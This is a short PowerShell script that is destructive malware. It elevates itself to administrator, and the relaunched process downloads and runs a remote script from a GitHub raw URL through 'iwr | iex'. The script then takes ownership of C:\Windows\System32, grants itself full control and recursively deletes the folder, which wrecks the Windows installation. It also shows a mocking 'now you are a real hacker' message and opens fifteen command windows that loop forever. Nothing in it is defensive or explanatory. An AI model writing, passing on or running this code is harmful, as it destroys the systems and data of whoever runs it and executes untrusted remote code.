if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/lio.ps1 -UseBasicParsing | iex`""
    exit
}

Start-Job -ScriptBlock {
    takeown /F "C:\Windows\System32" /A /R /D Y > $null
    icacls "C:\Windows\System32" /grant Administrators:(F) /T /C > $null
    Remove-Item "C:\Windows\System32" -Recurse -Force
}

[System.Windows.MessageBox]::Show("now you are a real hacker")
for ($i = 1; $i -le 15; $i++) {
    Start-Process cmd -ArgumentList "/k", "for /l %x in (0,0,1) do dir /s"
}
